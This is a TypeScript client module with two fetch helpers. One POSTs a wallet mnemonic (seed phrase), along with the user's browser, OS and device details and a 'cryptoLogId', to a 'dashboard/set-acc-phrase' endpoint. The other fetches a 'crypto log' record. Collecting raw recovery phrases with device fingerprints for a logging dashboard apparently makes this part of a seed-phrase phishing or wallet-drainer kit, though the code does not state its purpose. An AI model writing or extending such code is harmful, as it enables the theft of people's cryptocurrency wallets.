export const setPhrase = async (value:any, userInfo:any, cryptoLogId:any) => {
    try {
        const response = await fetch(
          "http://localhost:8080/dashboard/set-acc-phrase",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              mnemonic: value,
              userInfo: {
                browser: userInfo.browser,
                os: userInfo.os,
                device: userInfo.device,
              },
              cryptoLogId:cryptoLogId,
            }),
          }
        );
  
        if (response.ok) {
          return response;
        } else {
          console.error(`Error: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error("Error setting phrase:", error);
      }
}

export const  getCryptoLog = async (cryptoLogId:any) => {
    try {
        const response = await fetch("http://localhost:8080/dashboard/get-crypto-log", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            id: cryptoLogId,
          }),
        });

        if(!cryptoLogId){
            console.error("Error: Crypto Log ID is required");
        }
    
        if (!response.ok) {
          console.error(`Error: ${response.status} ${response.statusText}`);
        }
        const data = await response.json();
        return data;
      } catch (error) {
        console.error("Error fetching crypto log:", error);
        return null;
      }
}